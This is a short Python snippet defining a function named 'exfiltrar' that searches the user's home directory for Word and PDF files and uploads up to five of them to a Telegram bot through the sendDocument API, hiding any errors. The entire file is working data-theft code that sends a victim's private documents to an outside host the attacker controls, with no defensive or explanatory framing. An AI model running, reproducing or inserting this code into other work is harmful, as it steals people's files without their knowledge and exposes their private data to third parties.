import os
from glob import glob
import requests

def exfiltrar(token, chat_id):
    user_dir = os.path.expanduser("~")
    arquivos = glob(f"{user_dir}/**/*.doc*", recursive=True) + glob(f"{user_dir}/**/*.pdf", recursive=True)
    for arq in arquivos[:5]:
        try:
            files = {'document': open(arq, 'rb')}
            requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data={'chat_id': chat_id}, files=files)
        except: pass